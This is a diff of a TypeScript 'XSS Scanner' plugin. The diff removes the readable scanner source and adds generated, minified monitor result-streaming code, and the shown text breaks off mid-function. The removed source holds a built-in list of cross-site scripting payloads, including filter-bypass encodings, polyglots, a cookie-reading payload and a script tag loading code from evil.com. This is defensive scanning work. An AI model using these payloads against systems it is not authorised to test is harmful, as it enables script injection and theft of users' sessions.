@@ -3,7 +3,7 @@
  *
  * @plugin xss_scanner
  * @name XSS Scanner
- * @version 1.1.5
+ * @version 1.1.6
  * @author Sentinel Team
  * @main_category agent
  * @monitor_type risk
@@ -11,743 +11,171 @@
  * @target_asset_types ["web"]
  * @category vuln
  * @default_severity high
- * @tags xss, cross-site-scripting, vulnerability, security, web, owasp
+ * @tags xss, cross-site-scripting, vulnerability, security, web, owasp, capability:fetch, capability:monitor-events, monitor:results-stream-v2
  * @description Active XSS vulnerability scanner that tests URL parameters, form fields, and headers with various payloads
+ * @target_sources ["surface_asset","bounty_asset","scope"]
+ * @seed_bindings []
  */
-
-// Sentinel Dictionary API declaration
-declare const Sentinel: {
-    Dictionary: {
-        get(idOrName: string): Promise<any>;
-        getWords(idOrName: string, limit?: number): Promise<string[]>;
-        list(filter?: { dictType?: string; category?: string }): Promise<any[]>;
-        getMergedWords(idsOrNames: string[], deduplicate?: boolean): Promise<string[]>;
-    };
-    log(level: string, message: string): void;
-};
-
-interface ToolInput {
-    url: string;
-    method?: string;
-    params?: Record<string, string>;
-    headers?: Record<string, string>;
-    body?: string;
-    contentType?: string;
-    userAgent?: string;
-    testReflected?: boolean;
-    testStored?: boolean;
-    testDom?: boolean;
-    customPayloads?: string[];
-    dictionaryId?: string;
-}
-
-interface XssTest {
-    parameter: string;
-    location: string;
-    payload: string;
-    payloadType: string;
-    vulnerable: boolean;
-    confidence: string;
-    evidence?: string;
-    context?: string;
-    responseCode?: number;
-    responseTime?: number;
-}
-
-interface ToolOutput {
-    success: boolean;
-    data?: {
-        url: string;
-        method: string;
-        tests: XssTest[];
-        summary: {
-            totalTests: number;
-            vulnerableCount: number;
-            testedParameters: string[];
-            vulnerableParameters: string[];
-            missingSecurityHeaders: string[];
-        };
-    };
-    error?: string;
-}
-
-type PluginGlobals = typeof globalThis & {
-    get_input_schema?: typeof get_input_schema;
-    get_output_schema?: typeof get_output_schema;
-    analyze?: typeof analyze;
-};
-
-const pluginGlobals = globalThis as PluginGlobals;
-
-const DEFAULT_CONCURRENCY = 5;
-const MAX_CONCURRENCY = 10;
-
-// XSS payload categories
-const XSS_PAYLOADS: Record<string, { payload: string; type: string; context: string }[]> = {
-    basic: [
-        { payload: "<script>alert(1)</script>", type: "reflected", context: "html" },
-        { payload: "<script>alert('XSS')</script>", type: "reflected", context: "html" },
-        { payload: "<ScRiPt>alert(1)</ScRiPt>", type: "reflected", context: "html" },
-        { payload: "<script src=//evil.com/x.js></script>", type: "reflected", context: "html" },
-    ],
-    
-    event_handlers: [
-        { payload: '"><img src=x onerror=alert(1)>', type: "reflected", context: "attribute" },
-        { payload: "'\"><img src=x onerror=alert(1)>", type: "reflected", context: "attribute" },
-        { payload: "<img src=x onerror=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<svg onload=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<body onload=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<input onfocus=alert(1) autofocus>", type: "reflected", context: "html" },
-        { payload: "<marquee onstart=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<video><source onerror=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<audio src=x onerror=alert(1)>", type: "reflected", context: "html" },
-        { payload: "<details open ontoggle=alert(1)>", type: "reflected", context: "html" },
-    ],
-    
-    attribute_escape: [
-        { payload: '" onmouseover="alert(1)" x="', type: "reflected", context: "attribute" },
-        { payload: "' onmouseover='alert(1)' x='", type: "reflected", context: "attribute" },
-        { payload: '" onfocus="alert(1)" autofocus="', type: "reflected", context: "attribute" },
-        { payload: "' onfocus='alert(1)' autofocus='", type: "reflected", context: "attribute" },
-        { payload: '"><script>alert(1)</script>', type: "reflected", context: "attribute" },
-        { payload: "'><script>alert(1)</script>", type: "reflected", context: "attribute" },
-    ],
-    
-    javascript_context: [
-        { payload: "';alert(1);//", type: "reflected", context: "script" },
-        { payload: '";alert(1);//', type: "reflected", context: "script" },
-        { payload: "</script><script>alert(1)</script>", type: "reflected", context: "script" },
-        { payload: "'-alert(1)-'", type: "reflected", context: "script" },
-        { payload: '"-alert(1)-"', type: "reflected", context: "script" },
-        { payload: "${alert(1)}", type: "reflected", context: "template" },
-        { payload: "{{constructor.constructor('alert(1)')()}}", type: "reflected", context: "template" },
-    ],
-    
-    url_context: [
-        { payload: "javascript:alert(1)", type: "reflected", context: "href" },
-        { payload: "javascript:alert(document.domain)", type: "reflected", context: "href" },
-        { payload: "data:text/html,<script>alert(1)</script>", type: "reflected", context: "href" },
-        { payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", type: "reflected", context: "href" },
-    ],
-    
-    encoding_bypass: [
-        { payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", type: "reflected", context: "filter_bypass" },
-        { payload: "<scr\\x00ipt>alert(1)</scr\\x00ipt>", type: "reflected", context: "filter_bypass" },
-        { payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", type: "reflected", context: "filter_bypass" },
-        { payload: "<img src=x onerror=\\u0061lert(1)>", type: "reflected", context: "filter_bypass" },
-        { payload: "<img src=x onerror=&#97;lert(1)>", type: "reflected", context: "filter_bypass" },
-        { payload: "<img src=x onerror=&#x61;lert(1)>", type: "reflected", context: "filter_bypass" },
-    ],
-    
-    dom_based: [
-        { payload: "#<script>alert(1)</script>", type: "dom", context: "fragment" },
-        { payload: "#javascript:alert(1)", type: "dom", context: "fragment" },
-        { payload: "?default=<script>alert(1)</script>", type: "dom", context: "query" },
-        { payload: "javascript:alert(document.cookie)", type: "dom", context: "href" },
-    ],
-    
-    polyglot: [
-        { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", type: "reflected", context: "polyglot" },
-        { payload: "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><script>alert(1)</script>", type: "reflected", context: "polyglot" },
-        { payload: "'-alert(1)-'", type: "reflected", context: "polyglot" },
-    ],
-};
-
-// Security headers that mitigate XSS
-const SECURITY_HEADERS = [
-    "content-security-policy",
-    "x-xss-protection",
-    "x-content-type-options",
-];
-
-/**
- * Export input schema
- */
-export function get_input_schema() {
-    return {
-        type: "object",
-        required: ["url"],
-        properties: {
-            url: {
-                type: "string",
-                description: "Target URL to test for XSS vulnerabilities"
-            },
-            method: {
-                type: "string",
-                enum: ["GET", "POST", "PUT", "PATCH"],
-                description: "HTTP method to use",
-                default: "GET"
-            },
-            params: {
-                type: "object",
-                description: "URL parameters to test (key-value pairs)",
-                additionalProperties: { type: "string" }
-            },
-            headers: {
-                type: "object",
-                description: "Custom headers to include",
-                additionalProperties: { type: "string" }
-            },
-            body: {
-                type: "string",
-                description: "Request body (for POST/PUT/PATCH)"
-            },
-            contentType: {
-                type: "string",
-                description: "Content-Type header",
-                default: "application/x-www-form-urlencoded"
-            },
-            userAgent: {
-                type: "string",
-                description: "Custom User-Agent header"
-            },
-            testReflected: {
-                type: "boolean",
-                description: "Test for reflected XSS",
-                default: true
-            },
-            testStored: {
-                type: "boolean",
-                description: "Test for stored XSS indicators",
-                default: false
-            },
-            testDom: {
-                type: "boolean",
-                description: "Test for DOM-based XSS",
-                default: true
-            },
-            customPayloads: {
-                type: "array",
-                items: { type: "string" },
-                description: "Custom XSS payloads to test"
-            },
-            dictionaryId: {
-                type: "string",
-                "x-control": "dictionary-picker",
-                "x-dictionary-type": "xss_payload",
-                description: "Dictionary ID or name for XSS payloads"
-            }
-        }
-    };
-}
-
-pluginGlobals.get_input_schema = get_input_schema;
-
-/**
- * Export output schema
- */
-export function get_output_schema() {
-    return {
-        type: "object",
-        properties: {
-            success: { type: "boolean", description: "Whether the operation succeeded" },
-            data: {
-                type: "object",
-                properties: {
-                    url: { type: "string", description: "Target URL" },
-                    method: { type: "string" },
-                    tests: {
-                        type: "array",
-                        items: {
-                            type: "object",
-                            properties: {
-                                parameter: { type: "string" },
-                                payload: { type: "string" },
-                                vulnerable: { type: "boolean" },
-                                confidence: { type: "string" },
-                                evidence: { type: "string" }
-                            }
-                        },
-                        description: "XSS test results"
-                    },
-                    summary: {
-                        type: "object",
-                        properties: {
-                            totalTests: { type: "integer" },
-                            vulnerableCount: { type: "integer" },
-                            vulnerableParameters: { type: "array", items: { type: "string" } }
-                        }
-                    }
-                }
-            },
-            error: { type: "string", description: "Error message if failed" }
-        }
-    };
-}
-
-pluginGlobals.get_output_schema = get_output_schema;
-
-/**
- * Generate unique marker for payload tracking
- */
-function generateMarker(): string {
-    const chars = "abcdefghijklmnopqrstuvwxyz";
-    let result = "xss";
-    for (let i = 0; i < 8; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-/**
- * Extract parameters from URL and body
- */
-function extractParameters(
-    url: string,
-    body?: string,
-    contentType?: string,
-    providedParams?: Record<string, string>
-): Map<string, { value: string; location: "query" | "body" | "provided" }> {
-    const params = new Map<string, { value: string; location: "query" | "body" | "provided" }>();
-    
-    // Add provided params first
-    if (providedParams) {
-        for (const [key, value] of Object.entries(providedParams)) {
-            params.set(key, { value, location: "provided" });
-        }
-    }
-    
-    // Extract from URL
-    try {
-        const urlObj = new URL(url);
-        urlObj.searchParams.forEach((value, key) => {
-            if (!params.has(key)) {
-                params.set(key, { value, location: "query" });
-            }
-        });
-    } catch {
-        const match = url.match(/\?(.+)/);
-        if (match) {
-            match[1].split("&").forEach(pair => {
-                const [key, ...rest] = pair.split("=");
-                if (key && !params.has(key)) {
-                    params.set(key, {
-                        value: decodeURIComponent(rest.join("=")),
-                        location: "query"
-                    });
-                }
-            });
-        }
-    }
-    
-    // Extract from body
-    if (body) {
-        if (contentType?.includes("application/json")) {
-            try {
-                const json = JSON.parse(body);
-                const flatten = (obj: any, prefix = "") => {
-                    for (const [key, value] of Object.entries(obj)) {
-                        const fullKey = prefix ? `${prefix}.${key}` : key;
-                        if (typeof value === "object" && value !== null && !Array.isArray(value)) {
-                            flatten(value, fullKey);
-                        } else if (typeof value === "string" && !params.has(fullKey)) {
-                            params.set(fullKey, { value, location: "body" });
-                        }
-                    }
-                };
-                flatten(json);
-            } catch { /* ignore */ }
-        } else {
-            body.split("&").forEach(pair => {
-                const [key, ...rest] = pair.split("=");
-                if (key && !params.has(key)) {
-                    params.set(key, {
-                        value: decodeURIComponent(rest.join("=")),
-                        location: "body"
-                    });
-                }
-            });
-        }
-    }
-    
-    return params;
-}
-
-/**
- * Build URL with payload
- */
-function buildTestUrl(baseUrl: string, paramName: string, payload: string): string {
-    try {
-        const url = new URL(baseUrl);
-        url.searchParams.set(paramName, payload);
-        return url.toString();
-    } catch {
-        const separator = baseUrl.includes("?") ? "&" : "?";
-        return `${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`;
-    }
-}
-
-/**
- * Build body with payload
- */
-function buildTestBody(
-    originalBody: string | undefined,
-    paramName: string,
-    payload: string,
-    contentType?: string
-): string {
-    if (contentType?.includes("application/json")) {
-        try {
-            const json = JSON.parse(originalBody || "{}");
-            const parts = paramName.split(".");
-            let current = json;
-            for (let i = 0; i < parts.length - 1; i++) {
-                if (!current[parts[i]]) current[parts[i]] = {};
-                current = current[parts[i]];
-            }
-            current[parts[parts.length - 1]] = payload;
-            return JSON.stringify(json);
-        } catch {
-            return originalBody || "";
-        }
-    } else {
-        const params = new URLSearchParams(originalBody || "");
-        params.set(paramName, payload);
-        return params.toString();
-    }
-}
-
-/**
- * Check if payload is reflected in response
- */
-function checkReflection(
-    responseBody: string,
-    marker: string,
-    payload: string
-): { reflected: boolean; encoded: boolean; context: string; evidence: string } {
-    // Check for marker
-    if (!responseBody.includes(marker)) {
-        return { reflected: false, encoded: false, context: "", evidence: "" };
-    }
-    
-    // Check for exact payload reflection
-    if (responseBody.includes(payload)) {
-        const index = responseBody.indexOf(payload);
-        const start = Math.max(0, index - 50);
-        const end = Math.min(responseBody.length, index + payload.length + 50);
-        const context = responseBody.substring(start, end);
-        
-        // Determine context
-        if (/<script[^>]*>[^<]*$/i.test(context) || /^[^<]*<\/script>/i.test(context)) {
-            return { reflected: true, encoded: false, context: "script", evidence: context };
-        }
-        if (/on\w+\s*=\s*["'][^"']*$/i.test(context)) {
-            return { reflected: true, encoded: false, context: "event-handler", evidence: context };
-        }
-        if (/(?:href|src|action)\s*=\s*["'][^"']*$/i.test(context)) {
-            return { reflected: true, encoded: false, context: "url-attribute", evidence: context };
-        }
-        
-        return { reflected: true, encoded: false, context: "html", evidence: context };
-    }
-    
-    // Marker found but payload encoded
-    const index = responseBody.indexOf(marker);
-    const start = Math.max(0, index - 100);
-    const end = Math.min(responseBody.length, index + marker.length + 100);
-    return { reflected: true, encoded: true, context: "encoded", evidence: responseBody.substring(start, end) };
-}
-
-/**
- * Check for dangerous patterns in response
- */
-function hasDangerousPatterns(body: string, marker: string): boolean {
-    const patterns = [
-        new RegExp(`<script[^>]*>[^<]*${marker}`, "i"),
-        new RegExp(`on\\w+\\s*=\\s*["'][^"']*${marker}`, "i"),
-        new RegExp(`<[^>]+\\s+on\\w+\\s*=.*${marker}`, "i"),
-        new RegExp(`javascript:[^"']*${marker}`, "i"),
-    ];
-    
-    return patterns.some(p => p.test(body));
-}
-
-/**
- * Check security headers
- */
-function checkSecurityHeaders(headers: Record<string, string>): string[] {
-    const missing: string[] = [];
-    const headerKeys = Object.keys(headers).map(k => k.toLowerCase());
-    
-    for (const header of SECURITY_HEADERS) {
-        if (!headerKeys.includes(header)) {
-            missing.push(header);
-        }
-    }
-    
-    return missing;
-}
-
-/**
- * Run tasks with bounded concurrency. Host enforces global direct-fetch limit.
- */
-async function runWithConcurrency<T>(tasks: Array<() => Promise<T>>, concurrency: number): Promise<T[]> {
-    if (tasks.length === 0) {
-        return [];
-    }
-
-    const limit = Math.max(1, Math.min(concurrency, tasks.length));
-    const results = new Array<T>(tasks.length);
-    let nextIndex = 0;
-
-    const workers = Array.from({ length: limit }, async () => {
-        while (true) {
-            const index = nextIndex++;
-            if (index >= tasks.length) {
-                return;
-            }
-            results[index] = await tasks[index]();
-        }
-    });
-
-    await Promise.all(workers);
-    return results;
-}
-
-/**
- * Load payloads from dictionary or use built-in
- */
-async function loadPayloads(
-    dictionaryId?: string,
-    customPayloads?: string[],
-    testReflected?: boolean,
-    testDom?: boolean
-): Promise<{ payload: string; type: string; context: string }[]> {
-    const payloads: { payload: string; type: string; context: string }[] = [];
-    
-    // Custom payloads first
-    if (customPayloads && customPayloads.length > 0) {
-        for (const p of customPayloads) {
-            payloads.push({ payload: p, type: "custom", context: "unknown" });
-        }
-    }
-    
-    // Try dictionary
-    if (dictionaryId) {
-        try {
-            if (typeof Sentinel !== "undefined" && Sentinel.Dictionary) {
-                const words = await Sentinel.Dictionary.getWords(dictionaryId);
-                if (words && words.length > 0) {
-                    for (const p of words) {
-                        payloads.push({ payload: p, type: "dictionary", context: "unknown" });
-                    }
-                    return payloads;
-                }
-            }
-        } catch (e) {
-            console.debug(`Failed to load XSS dictionary: ${e}`);
-        }
-    }
-    
-    // Use built-in payloads
-    if (testReflected !== false) {
-        payloads.push(...XSS_PAYLOADS.basic);
-        payloads.push(...XSS_PAYLOADS.event_handlers);
-        payloads.push(...XSS_PAYLOADS.attribute_escape);
-        payloads.push(...XSS_PAYLOADS.javascript_context);
-        payloads.push(...XSS_PAYLOADS.url_context);
-        payloads.push(...XSS_PAYLOADS.encoding_bypass);
-        payloads.push(...XSS_PAYLOADS.polyglot);
-    }
-    
-    if (testDom !== false) {
-        payloads.push(...XSS_PAYLOADS.dom_based);
-    }
-
-    const uniquePayloads = new Map<string, { payload: string; type: string; context: string }>();
-    for (const payload of payloads) {
-        const key = `${payload.type}:${payload.context}:${payload.payload}`;
-        if (!uniquePayloads.has(key)) {
-            uniquePayloads.set(key, payload);
-        }
-    }
-
-    return Array.from(uniquePayloads.values());
-}
-
-/**
- * Main analysis function
- */
-export async function analyze(input: ToolInput): Promise<ToolOutput> {
-    const startTime = performance.now();
-    
-    try {
-        // Validate input
-        if (!input.url || typeof input.url !== "string") {
-            return {
-                success: false,
-                error: "Invalid input: url parameter is required"
-            };
-        }
-        
-        let baseUrl = input.url;
-        if (!baseUrl.startsWith("http://") && !baseUrl.startsWith("https://")) {
-            baseUrl = `https://${baseUrl}`;
-        }
-        
-        const method = (input.method || "GET").toUpperCase();
-        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-        const contentType = input.contentType || "application/x-www-form-urlencoded";
-        
-        // Extract parameters
-        const params = extractParameters(baseUrl, input.body, contentType, input.params);
-        
-        if (params.size === 0) {
-            return {
-                success: false,
-                error: "No parameters found to test. Provide params or use a URL with query parameters."
-            };
-        }
-        
-        // Load payloads
-        const payloads = await loadPayloads(
-            input.dictionaryId,
-            input.customPayloads,
-            input.testReflected,
-            input.testDom
-        );
-        
-        const tests: XssTest[] = [];
-        const vulnerableParams = new Set<string>();
-        const compromisedParams = new Set<string>();
-        let missingHeaders: string[] = [];
-        
-        // Generate marker for this scan
-        const marker = generateMarker();
-        
-        // Create test tasks
-        const tasks: (() => Promise<XssTest | null>)[] = [];
-        
-        for (const [paramName, { value, location }] of params) {
-            // Skip very long values
-            if (value.length > 500) continue;
-            
-            for (const { payload: basePayload, type, context } of payloads) {
-                tasks.push(async () => {
-                    if (compromisedParams.has(paramName)) {
-                        return null;
-                    }
-
-                    const payload = basePayload.replace(/alert\(1\)/g, `alert('${marker}')`);
-                    const testStart = performance.now();
-                    
-                    try {
-                        let testUrl = baseUrl;
-                        let testBody = input.body;
-                        
-                        if (location === "query" || location === "provided") {
-                            testUrl = buildTestUrl(baseUrl, paramName, payload);
-                        } else if (location === "body") {
-                            testBody = buildTestBody(input.body, paramName, payload, contentType);
-                        }
-                        
-                        const headers: Record<string, string> = {
-                            "User-Agent": userAgent,
-                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                            ...input.headers,
-                        };
-                        
-                        if (method !== "GET" && testBody) {
-                            headers["Content-Type"] = contentType;
-                        }
-                        
-                        const response = await fetch(testUrl, {
-                            method,
-                            headers,
-                            body: method !== "GET" ? testBody : undefined,
-                            redirect: "follow",
-                            timeout: 10000,
-                        });
-                        
-                        const responseTime = Math.round(performance.now() - testStart);
-                        
-                        // Check security headers on first response
-                        if (missingHeaders.length === 0) {
-                            const respHeaders: Record<string, string> = {};
-                            response.headers.forEach((v, k) => { respHeaders[k] = v; });
-                            missingHeaders = checkSecurityHeaders(respHeaders);
-                        }
-                        
-                        // Only check HTML responses
-                        const respContentType = response.headers.get("content-type") || "";
-                        if (!respContentType.includes("text/html") && !respContentType.includes("application/xhtml")) {
-                            return null;
-                        }
-                        
-                        const body = await response.text();
-                        const reflection = checkReflection(body, marker, payload);
-                        
-                        if (reflection.reflected && !reflection.encoded) {
-                            const dangerous = hasDangerousPatterns(body, marker);
-                            compromisedParams.add(paramName);
-                            return {
-                                parameter: paramName,
-                                location,
-                                payload,
-                                payloadType: type,
-                                vulnerable: true,
-                                confidence: dangerous ? "high" : "medium",
-                                evidence: reflection.evidence.substring(0, 300),
-                                context: reflection.context,
-                                responseCode: response.status,
-                                responseTime,
-                            };
-                        }
-                        
-                        return null;
-                        
-                    } catch (e: any) {
-                        return null;
-                    }
-                });
-            }
-        }
-        
-        // Execute tests with bounded plugin concurrency
-        const results = await runWithConcurrency(tasks, DEFAULT_CONCURRENCY);
-        
-        // Collect results
-        for (const result of results) {
-            if (result && result.vulnerable) {
-                tests.push(result);
-                vulnerableParams.add(result.parameter);
-            }
-        }
-        
-        // Deduplicate by parameter (keep highest confidence)
-        const uniqueTests = new Map<string, XssTest>();
-        for (const test of tests) {
-            const key = `${test.parameter}:${test.context}`;
-            const existing = uniqueTests.get(key);
-            if (!existing || (test.confidence === "high" && existing.confidence !== "high")) {
-                uniqueTests.set(key, test);
-            }
-        }
-        
-        const finalTests = Array.from(uniqueTests.values());
-        
-        return {
-            success: true,
-            data: {
-                url: baseUrl,
-                method,
-                tests: finalTests,
-                summary: {
-                    totalTests: tasks.length,
-                    vulnerableCount: finalTests.length,
-                    testedParameters: Array.from(params.keys()),
-                    vulnerableParameters: Array.from(vulnerableParams),
-                    missingSecurityHeaders: missingHeaders,
-                },
-            },
-        };
-        
-    } catch (error: any) {
-        return {
-            success: false,
-            error: error instanceof Error ? error.message : String(error),
-        };
-    }
-}
-
-pluginGlobals.analyze = analyze;
+// Generated by scripts/build_monitor_plugins.mjs from source/agent/xss_scanner/index.ts; edit the source modules.
+var MONITOR_DELTA_INPUT_FIELDS=["targets","target_objects","service_targets","__monitorExecution","previousSnapshots","previous_snapshots","dictionaryEntries","\
+dictionary"];function isJsonObject(value){return value!==null&&typeof value==="object"&&!Array.isArray(value)}function serializedBytes(text){let bytes=0;for(let index=0;index<
+text.length;index++){const code=text.charCodeAt(index);if(code<128)bytes++;else if(code<2048)bytes+=2;else if(code>=55296&&code<=56319){bytes+=4;index++}else bytes+=
+3}return bytes}function jsonBytes(value){return serializedBytes(JSON.stringify(value))}function objectNode(members){let bytes=2+Math.max(0,members.size-1);const entries=[];
+for(const[key,entry]of members){bytes+=entry.keyBytes+1+entry.node.bytes;entries.push([key,entry.node.value])}return{kind:"object",value:Object.fromEntries(entries),
+bytes,members}}function node(value){if(Array.isArray(value)){let bytes=2+Math.max(0,value.length-1);for(const item of value)bytes+=node(item).bytes;return{kind:"\
+array",value,bytes}}if(isJsonObject(value)){return objectNode(new Map(Object.entries(value).map(([key,value2])=>[key,{keyBytes:jsonBytes(key),node:node(value2)}])))}
+return{kind:"scalar",value,bytes:jsonBytes(value)}}function validateDeltaData(data){if(!isJsonObject(data)){throw new Error("Monitor result delta must contain s\
+uccess:true and an object data")}for(const key of MONITOR_DELTA_INPUT_FIELDS){if(Object.prototype.hasOwnProperty.call(data,key)){throw new Error(`Monitor result\
+ delta must not repeat execution input field data.${key}`)}}if(data.snapshots!==void 0&&!isJsonObject(data.snapshots)){throw new Error("Monitor snapshot delta m\
+ust be an object")}}function copyMonitorDelta(output){if(!isJsonObject(output)||output.success!==true){throw new Error("Monitor result delta must contain succes\
+s:true and an object data")}validateDeltaData(output.data);const data=JSON.parse(JSON.stringify(output.data));validateDeltaData(data);return node(data)}var EMPTY_REQUEST_BYTES=jsonBytes({sequence:0,work:[]});function monitorRequestBytes(sequence,workContentsBytes){return EMPTY_REQUEST_BYTES-1+jsonBytes(sequence)+
+workContentsBytes}var MAX_WORK_ITEMS=32;var MAX_JSON_BYTES=2*1024*1024;var COMMIT_INTERVAL_MS=5e3;function positiveLimit(value,maximum,label){if(!Number.isInteger(value)||Number(
+value)<1||Number(value)>maximum){throw new Error(`Monitor result stream ${label} must be an integer between 1 and ${maximum}`)}return Number(value)}function createMonitorResultStream(input){
+const context=isJsonObject(input)?input.__monitorExecution:void 0;if(context===void 0){return{enabled:false,assertHealthy(){},async record(_target,_key,_output,_options){},
+async finish(finalOutput){return finalOutput}}}if(!isJsonObject(context)||!isJsonObject(context.result_stream)||context.result_stream.protocol!=="monitor-result\
+s-v2"){throw new Error("Monitor execution requires the monitor-results-v2 result stream")}const monitor=globalThis.Sentinel?.Monitor;if(typeof monitor?.commitResults!==
+"function"){throw new Error("Monitor execution requires Sentinel.Monitor.commitResults")}const stream=context.result_stream;if(!Array.isArray(stream.targets)||stream.
+targets.some(target=>typeof target!=="string"||!target)){throw new Error("Monitor result stream requires the host-owned targets array")}const expected=new Set(stream.
+targets);const chunkSize=positiveLimit(stream.max_work_items,MAX_WORK_ITEMS,"max_work_items");const maxPending=positiveLimit(stream.max_pending_commits,2,"max_p\
+ending_commits");const byteLimit=positiveLimit(stream.max_bytes,MAX_JSON_BYTES,"max_bytes");const completed=new Set;const pending=new Set;const bufferedKeys=new Set;
+let buffered=[];let workContentsBytes=0;let sequence=0;let lastCommitAt=Date.now();let failed;let finished=false;let serialization=Promise.resolve();let committedItems=0;
+let submittedBatches=0;let maxPendingObserved=0;let backpressureMs=0;let submittedJsonBytes=0;let committedJsonBytes=0;let maxBatchJsonBytes=0;function assertHealthy(){
+if(failed)throw failed;if(finished)throw new Error("Monitor result stream is already finished")}function latch(error){failed||(failed=error instanceof Error?error:
+new Error(String(error)));return failed}async function capacity(){const start=Date.now();while(pending.size>=maxPending){await Promise.race(pending);if(failed)throw failed}
+backpressureMs+=Date.now()-start;if(failed)throw failed}async function flush(){assertHealthy();if(!buffered.length)return;await capacity();const request={sequence:sequence+
+1,work:buffered};const encodedBytes=monitorRequestBytes(request.sequence,workContentsBytes);if(encodedBytes>byteLimit)throw new Error("Monitor result batch exce\
+eds the JSON byte limit");sequence++;const keys=buffered.map(item=>JSON.stringify([item.target,item.key]));buffered=[];workContentsBytes=0;lastCommitAt=Date.now();
+submittedBatches++;submittedJsonBytes+=encodedBytes;maxBatchJsonBytes=Math.max(maxBatchJsonBytes,encodedBytes);let commit;commit=Promise.resolve().then(async()=>{
+const ack=await monitor.commitResults(request);if(ack?.ok!==true||ack.sequence!==request.sequence){throw new Error(`Monitor result commit ${request.sequence} wa\
+s not acknowledged`)}committedItems+=request.work.length;committedJsonBytes+=encodedBytes}).catch(error=>{latch(error)}).finally(()=>{for(const key of keys)bufferedKeys.
+delete(key);pending.delete(commit)});pending.add(commit);maxPendingObserved=Math.max(maxPendingObserved,pending.size);await capacity()}function exclusive(action){
+const operation=serialization.then(action).catch(error=>{throw latch(error)});serialization=operation.then(()=>{},()=>{});return operation}async function record(target,key,output,options={}){
+return exclusive(async()=>{assertHealthy();if(typeof target!=="string"||!expected.has(target))throw new Error("Monitor work target is not owned by this executio\
+n");if(typeof key!=="string"||!key||key.length>2048)throw new Error("Monitor work key must contain 1 to 2048 characters");if(completed.has(target))throw new Error(
+"Monitor work cannot follow a completed target");const identity=JSON.stringify([target,key]);if(bufferedKeys.has(identity))throw new Error("Monitor work repeats\
+ an unacknowledged target/key");const status=options.status??"ok";if(!["ok","failed","skipped"].includes(status))throw new Error("Invalid monitor work status");
+const delta=copyMonitorDelta(output);if(status!=="ok"&&isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length){throw new Error("Only suc\
+cessful work may update snapshots")}if(isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length&&options.snapshot_complete!==true){throw new Error(
+"Snapshot updates require an explicitly complete observation")}const item={target,key,status,complete:options.complete!==false,output:{success:true,data:delta.value}};
+if(options.error!==void 0)item.error=options.error;if(options.failure_category!==void 0)item.failure_category=options.failure_category;if(options.snapshot_complete!==
+void 0)item.snapshot_complete=options.snapshot_complete;const itemBytes=jsonBytes(item);if(monitorRequestBytes(sequence+1,itemBytes)>byteLimit){throw new Error(
+"A single monitor work result exceeds the JSON byte limit")}let combinedWorkBytes=workContentsBytes+(buffered.length?1:0)+itemBytes;if(buffered.length&&monitorRequestBytes(
+sequence+1,combinedWorkBytes)>byteLimit){await flush();combinedWorkBytes=itemBytes}buffered.push(item);workContentsBytes=combinedWorkBytes;bufferedKeys.add(identity);
+if(item.complete)completed.add(target);if(buffered.length>=chunkSize||Date.now()-lastCommitAt>=COMMIT_INTERVAL_MS)await flush()})}async function finish(finalOutput){
+return exclusive(async()=>{assertHealthy();await flush();await Promise.all(pending);if(failed)throw failed;const finalRecord=isJsonObject(finalOutput)?finalOutput:
+void 0;if(finalRecord?.success===false){throw new Error(typeof finalRecord.error==="string"&&finalRecord.error?finalRecord.error:"Monitor plugin reported an uns\
+uccessful execution")}if(completed.size!==expected.size){throw new Error(`Monitor result stream ended before all targets completed (${completed.size}/${expected.
+size})`)}const finalDiagnostics=finalRecord&&isJsonObject(finalRecord.data)&&isJsonObject(finalRecord.data.summary)&&isJsonObject(finalRecord.data.summary.diagnostics)?
+finalRecord.data.summary.diagnostics:{};const pluginMetrics=Object.fromEntries(Object.entries(finalDiagnostics).filter(([,value])=>typeof value==="number"&&Number.
+isFinite(value)&&value>=0));finished=true;return{success:true,data:{stream_complete:true,summary:{diagnostics:{...pluginMetrics,submitted_json_bytes:submittedJsonBytes,
+committed_json_bytes:committedJsonBytes,max_batch_json_bytes:maxBatchJsonBytes,committed_work_items:committedItems,completed_targets:completed.size,submitted_batches:submittedBatches,
+max_pending_commits:maxPendingObserved,backpressure_ms_sum:backpressureMs}}}}})}return{enabled:true,assertHealthy,record,finish}}var aliases=["targets","urls","url","domains","domain","ips","ip"];var activeScope;function observedFetch(input,init){const scope=activeScope;if(!scope)return globalThis.
+fetch(input,init);const key=`http:${++scope.sequence}`;const operation=(async()=>{scope.stream.assertHealthy();let response;try{response=await globalThis.fetch(
+input,init)}catch(error){await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"http_observation",success:false}]}},{status:"failed",complete:false,
+error:String(error).slice(0,2048),failure_category:"network_other"});throw error}await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"\
+http_observation",success:true,statusCode:response.status,method:String(init?.method||"GET")}]}},{complete:false});return response})();scope.pending.add(operation);
+void operation.finally(()=>scope.pending.delete(operation)).catch(()=>{});return operation}async function runMonitorTool(input,schema,business){const stream=createMonitorResultStream(
+input);if(activeScope)throw new Error("A monitored business scope is already active");if(!stream.enabled)return await business(input);try{const properties=schema?.
+properties||{};const supported=aliases.filter(key=>Object.prototype.hasOwnProperty.call(properties,key));if(!supported.length)throw new Error("Monitor business \
+schema must declare a standard target input");const targets=input.__monitorExecution.result_stream.targets;for(const target of targets){stream.assertHealthy();const ordinary={
+...input};delete ordinary.__monitorExecution;for(const key of aliases){if(!supported.includes(key))delete ordinary[key];else ordinary[key]=["url","domain","ip"].
+includes(key)?target:[target]}let result;const scope={target,stream,sequence:0,pending:new Set};activeScope=scope;try{result=await business(ordinary)}catch(error){
